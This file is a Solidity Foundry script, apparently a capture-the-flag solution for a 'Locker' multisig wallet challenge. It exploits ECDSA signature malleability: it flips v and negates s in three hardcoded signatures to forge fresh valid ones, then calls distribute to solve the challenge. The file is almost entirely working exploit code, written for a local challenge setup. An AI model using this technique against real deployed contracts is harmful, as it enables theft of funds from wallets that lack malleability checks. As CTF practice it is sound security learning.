//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
import {Script} from "forge-std/Script.sol";
import "src/SMILEY-2025/MultiSig-Wallet/Locker.sol";


contract Solve is Script{
    function run()public{
        SetupLocker setup=SetupLocker(0x5FbDB2315678afecb367f032d93F642f64180aa3);
        vm.startBroadcast();
        Locker locker=Locker(setup.challenge());
        Exploit exploit=new Exploit();
        exploit.pwn(setup);
        require(setup.isSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}


contract Exploit{

    uint256 n=115792089237316195423570985008687907852837564279074904382605163141518161494337;
    function pwn(SetupLocker setup)public{
        Locker locker=Locker(setup.challenge());

        uint8 v1= 27;
        bytes32 r1=0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9;
        bytes32 s1=0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9;

        uint8 v2= 28;
        bytes32 r2=0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7;
        bytes32 s2= 0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910;

        uint8 v3= 27;
        bytes32 r3= 0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d;
        bytes32 s3= 0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2;

        (v1,s1)=get_mallsig(v1,s1);
        (v2,s2)=get_mallsig(v2,s2);
        (v3,s3)=get_mallsig(v3,s3);
        signature[] memory signatures=new signature[](3);
        signature memory sig1=signature({
            v:v1,
            r:r1,
            s:s1
        });
        signatures[0]=sig1;
        signature memory sig2=signature({
            v:v2,
            r:r2,
            s:s2
        });
        signatures[1]=sig2;
        signature memory sig3=signature({
            v:v3,
            r:r3,
            s:s3
        });
        signatures[2]=sig3;
        locker.distribute(signatures);
    }


    function get_mallsig(uint8 v, bytes32 s)public returns (uint8,bytes32){
        v= v==27? 28: 27;
        s=bytes32(n-uint256(s));
        return (v,s);
    }
}